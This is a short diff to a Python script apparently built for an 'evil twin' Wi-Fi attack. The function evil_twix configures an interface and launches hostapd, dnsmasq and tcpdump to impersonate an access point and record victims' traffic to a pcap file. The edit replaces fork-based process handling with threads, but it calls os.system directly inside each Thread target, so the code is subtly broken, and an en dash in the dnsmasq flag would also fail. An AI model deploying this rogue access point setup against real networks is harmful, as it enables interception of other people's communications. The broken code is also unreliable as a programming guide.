@@ -2,6 +2,7 @@
 import os
 from random import randint
 import re
+import threading
 
 def get_interfaces():
     
@@ -93,17 +94,15 @@ def evil_twix(interface, target):
 
     os.system("ip addr add 10.0.0.1/24 dev %s" % interface)
 
-    hostapd = os.fork()
-    dnsmasq = os.fork()
+    hostapd = threading.Thread(target=os.system("hostapd hostapd.conf"))
+    dnsmasq = threading.Thread(target=os.system("dnsmasq -d –C dnsmasq.conf"))
+    tcpdump = threading.Thread(target=os.system("tcpdump -s 0 -i %s -w test.pcap" % interface))
 
     print("\nStarting the attack ...")
 
-    if dnsmasq:
-        os.system("dnsmasq -d –C dnsmasq.conf")
-    elif hostapd:
-        os.system("hostapd hostapd.conf")
-    else:
-        os.system("tcpdump -s 0 -i %s -w test.pcap" % interface)
+    hostapd.start()
+    dnsmasq.start()
+    tcpdump.start()
 
 if __name__ == "__main__":
     
